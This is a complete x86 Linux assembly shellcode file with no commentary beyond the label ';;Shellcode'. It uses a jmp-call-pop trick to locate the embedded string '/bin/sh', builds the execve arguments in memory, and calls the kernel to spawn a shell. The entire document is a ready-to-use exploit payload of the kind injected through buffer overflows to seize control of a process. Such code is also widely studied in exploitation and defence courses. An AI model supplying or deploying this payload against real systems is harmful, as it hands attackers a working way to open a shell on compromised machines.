;;Shellcode
section .text
global _start
_start:
	jmp dir_cadena
codigo:
	pop esi
	xor eax,eax
	mov [esi+7], al
	lea ebx, [esi]
	mov [esi+8],ebx
	lea ecx, [esi+8]
	mov dword [esi+12],eax
	lea edx, [esi+12]
	mov al, 11
	int 0x80
dir_cadena:
	call codigo
	db '/bin/shNXXXXYYYY'


